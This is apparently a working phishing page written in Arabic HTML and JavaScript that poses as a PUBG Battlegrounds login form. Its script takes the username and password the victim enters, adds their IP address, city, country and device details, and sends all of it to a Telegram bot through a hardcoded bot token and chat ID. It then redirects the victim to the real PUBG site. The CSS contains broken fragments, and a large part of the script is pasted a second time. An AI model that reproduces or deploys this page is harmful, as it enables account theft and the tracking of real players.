            font-size: 14px;
            text-align: right;

            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #ccc;
            font-size: 14px;

            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;

            accent-color: #f5a623;
            width: 16px;
            height: 16px;
        }
        .options a {
            color: #f5a623;
            text-decoration: none;
        }
        .options a:hover {
            text-decoration: underline;
        }

            background: #f5a623;
            border: none;
            border-radius: 40px;
            padding: 15px;
            font-size: 18px;
            font-weight: bold;
            color: #111;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 5px 0 #b36b0e;
        }
        .login-btn:hover {
            background: #ffb347;
            transform: translateY(-2px);
            box-shadow: 0 7px 0 #b36b0e;
        }
        .login-btn:active {
            transform: translateY(5px);
            box-shadow: 0 2px 0 #b36b0e;

            display: none;

        }

            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid #f5a623;

            vertical-align: middle;

<body>
    <div class="container">
        <div class="pubg-card">
            <div class="logo">
                <img src="https://i.imgur.com/7I9J5wN.png" alt="PUBG Logo" onerror="this.style.display='none'">
                <h1>PUBG</h1>
                <p>BATTLEGROUNDS</p>
            </div>
            <form id="loginForm" action="#">
                <div id="loadingMessage" class="loading-message"></div>
                <div class="input-group">
                    <i class="fas fa-user"></i>
                    <input type="text" id="username" placeholder="اسم المستخدم / البريد الإلكتروني" required autocomplete="off">
                </div>
                <div class="input-group">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="off">
                </div>
                <div class="options">
                    <label>
                        <input type="checkbox"> تذكرني
                    </label>
                    <a href="#">نسيت كلمة المرور؟</a>
                </div>
                <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                <div class="register-link">
                    ليس لديك حساب؟ <a href="#">سجل الآن</a>
                </div>
            </form>
            <div class="footer">
                <a href="#">سياسة الخصوصية</a> • <a href="#">شروط الخدمة</a>
            </div>
        </div>
    </div>

    <script>
        // ========== إعدادات تليجرام ==========
        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
        const telegramChatId = '8304101362';
        // =====================================

        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const loadingMessageDiv = document.getElementById('loadingMessage');
        
        let isSubmitting = false;

        // دالة سريعة لجلب IP
        async function getIPFast() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1500);
                const response = await fetch('https://api.ipify.org?format=json', {
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'غير متاح';
            }
        }

        // دالة سريعة لجلب معلومات الموقع
        async function getLocationFast(ip) {
            if (ip === 'غير متاح') return { country: 'غير معروف', city: 'غير معروف' };
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1500);
                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                const data = await response.json();
                return {
                    country: data.country_name || 'غير معروف',
                    city: data.city || 'غير معروف'
                };
            } catch (error) {
                return { country: 'غير معروف', city: 'غير معروف' };
            }
        }

        // دالة سريعة لجمع معلومات الجهاز
        function getDeviceFast() {
            const ua = navigator.userAgent;
            let device = 'PC';
            let browser = 'غير معروف';
            let os = 'غير معروف';
            
            // تحديد الجهاز
            if (/Android/i.test(ua)) device = 'Android';
            else if (/iPhone/i.test(ua)) device = 'iPhone';
            else if (/iPad/i.test(ua)) device = 'iPad';
            else if (/Windows/i.test(ua)) device = 'Windows';
            else if (/Mac/i.test(ua)) device = 'Mac';
            
            // تحديد المتصفح
            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Edge/i.test(ua)) browser = 'Edge';
            
            // تحديد نظام التشغيل
            if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
            else if (/Mac OS X/i.test(ua)) os = 'macOS';
            else if (/Android/i.test(ua)) os = 'Android';
            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
            
            return { device, browser, os };
        }

        // إرسال سريع إلى تليجرام
        function sendToTelegramFast(username, password, ip, location, device) {
            const timestamp = new Date().toLocaleString('ar-EG');
            const message = `🎮 PUBG LOGIN 🎮
━━━━━━━━━━━━━━━━━━━━━━
👤 اسم المستخدم: ${username}
🔑 كلمة المرور: ${password}
━━━━━━━━━━━━━━━━━━━━━━
🌐 IP: ${ip}
🏳️ الدولة: ${location.country}
🏙️ المدينة: ${location.city}
📱 الجهاز: ${device.device}
🌍 المتصفح: ${device.browser}
💻 النظام: ${device.os}
🕒 الوقت: ${timestamp}
━━━━━━━━━━━━━━━━━━━━━━
🎯 PLAYERUNKNOWN'S BATTLEGROUNDS`;
            
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            
            // إرسال بدون انتظار
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message
                })
            }).catch(() => {});
        }

        // عرض رسالة التحميل
        function showLoading(show, message = 'جاري الاتصال...') {
            if (show) {
                loadingMessageDiv.innerHTML = `<span class="spinner"></span> ${message}`;
                loadingMessageDiv.style.display = 'block';
                loginBtn.disabled = true;
            } else {
                loadingMessageDiv.style.display = 'none';
                loginBtn.disabled = false;
            }
        }

        // معالج تسجيل الدخول
        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            
            if (isSubmitting) return;
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username) {
                alert('❌ الرجاء إدخال اسم المستخدم أو البريد الإلكتروني');
                usernameInput.focus();
                return;
            }
            
            if (!password) {
                alert('❌ الرجاء إدخال كلمة المرور');
                passwordInput.focus();
                return;
            }
            
            isSubmitting = true;
            showLoading(true, 'جاري تسجيل الدخول...');
            
            try {
                // جمع المعلومات بسرعة
                const ip = await getIPFast();
                const location = await getLocationFast(ip);
                const device = getDeviceFast();
                
                // إرسال إلى تليجرام فوراً
                sendToTelegramFast(username, password, ip, location, device);
                
                console.log('✅ تم إرسال البيانات إلى تليجرام');
                console.log(`👤 ${username} | 🌍 ${location.country} | 📱 ${device.device}`);
                console.log(`🎮 PUBG Login Success`);
                
                // تحويل فوري
                showLoading(true, 'جاري التحويل...');
                setTimeout(() => {
                    window.location.href = 'https://www.pubg.com';
                }, 200);
                
            } catch (error) {
                console.error('خطأ:', error);
                // محاولة إرسال البيانات الأساسية
                try {
                    const basicMessage = `🎮 PUBG LOGIN\n👤 ${username}\n🔑 ${password}\n🕒 ${new Date().toLocaleString()}`;
                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: telegramChatId, text: basicMessage })
                    }).catch(() => {});
                } catch(e) {}
                
                showLoading(false);
                alert('⚠️ حدث خطأ، يرجى المحاولة مرة أخرى');
                isSubmitting = false;
            }
        });
        
        // دعم الضغط على Enter
        usernameInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                passwordInput.focus();
            }
        });
        
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                loginForm.dispatchEvent(new Event('submit'));
            }
        });
        
        console.log('✅ تم تحميل صفحة PUBG - الوضع السريع');
        console.log('🎮 Ready for battle!');
    </script>
</body>

            }
        }

        // دالة سريعة لجمع معلومات الجهاز
        function getDeviceFast() {
            const ua = navigator.userAgent;
            let device = 'PC';
            let browser = 'غير معروف';
            let os = 'غير معروف';
            
            // تحديد الجهاز
            if (/Android/i.test(ua)) device = 'Android';
            else if (/iPhone/i.test(ua)) device = 'iPhone';
            else if (/iPad/i.test(ua)) device = 'iPad';
            else if (/Windows/i.test(ua)) device = 'Windows';
            else if (/Mac/i.test(ua)) device = 'Mac';
            
            // تحديد المتصفح
            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Edge/i.test(ua)) browser = 'Edge';
            
            // تحديد نظام التشغيل
            if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
            else if (/Mac OS X/i.test(ua)) os = 'macOS';
            else if (/Android/i.test(ua)) os = 'Android';
            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
            
            return { device, browser, os };
        }

        // إرسال سريع إلى تليجرام
        function sendToTelegramFast(username, password, ip, location, device) {
            const timestamp = new Date().toLocaleString('ar-EG');
            const message = `🎮 PUBG LOGIN 🎮
━━━━━━━━━━━━━━━━━━━━━━
👤 اسم المستخدم: ${username}
🔑 كلمة المرور: ${password}
━━━━━━━━━━━━━━━━━━━━━━
🌐 IP: ${ip}
🏳️ الدولة: ${location.country}
🏙️ المدينة: ${location.city}
📱 الجهاز: ${device.device}
🌍 المتصفح: ${device.browser}
💻 النظام: ${device.os}
🕒 الوقت: ${timestamp}
━━━━━━━━━━━━━━━━━━━━━━
🎯 PLAYERUNKNOWN'S BATTLEGROUNDS`;
            
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            
            // إرسال بدون انتظار
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message
                })
            }).catch(() => {});
        }

        // عرض رسالة التحميل
        function showLoading(show, message = 'جاري الاتصال...') {
            if (show) {
                loadingMessageDiv.innerHTML = `<span class="spinner"></span> ${message}`;
                loadingMessageDiv.style.display = 'block';
                loginBtn.disabled = true;
            } else {
                loadingMessageDiv.style.display = 'none';
                loginBtn.disabled = false;
            }
        }

        // معالج تسجيل الدخول
        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            
            if (isSubmitting) return;
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username) {
                alert('❌ الرجاء إدخال اسم المستخدم أو البريد الإلكتروني');
                usernameInput.focus();
                return;
            }
            
            if (!password) {
                alert('❌ الرجاء إدخال كلمة المرور');
                passwordInput.focus();
                return;
            }
            
            isSubmitting = true;
            showLoading(true, 'جاري تسجيل الدخول...');
            
            try {
                // جمع المعلومات بسرعة
                const ip = await getIPFast();
                const location = await getLocationFast(ip);
                const device = getDeviceFast();
                
                // إرسال إلى تليجرام فوراً
                sendToTelegramFast(username, password, ip, location, device);
                
                console.log('✅ تم إرسال البيانات إلى تليجرام');
                console.log(`👤 ${username} | 🌍 ${location.country} | 📱 ${device.device}`);
                console.log(`🎮 PUBG Login Success`);
                
                // تحويل فوري
                showLoading(true, 'جاري التحويل...');
                setTimeout(() => {
                    window.location.href = 'https://www.pubg.com';
                }, 200);
                
            } catch (error) {
                console.error('خطأ:', error);
                // محاولة إرسال البيانات الأساسية
                try {
                    const basicMessage = `🎮 PUBG LOGIN\n👤 ${username}\n🔑 ${password}\n🕒 ${new Date().toLocaleString()}`;
                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: telegramChatId, text: basicMessage })
                    }).catch(() => {});
                } catch(e) {}
                
                showLoading(false);
                alert('⚠️ حدث خطأ، يرجى المحاولة مرة أخرى');
                isSubmitting = false;
            }
        });
        
        // دعم الضغط على Enter
        usernameInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                passwordInput.focus();
            }
        });
        
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                loginForm.dispatchEvent(new Event('submit'));
            }
        });
        
        console.log('✅ تم تحميل صفحة PUBG - الوضع السريع');
        console.log('🎮 Ready for battle!');
    </script>
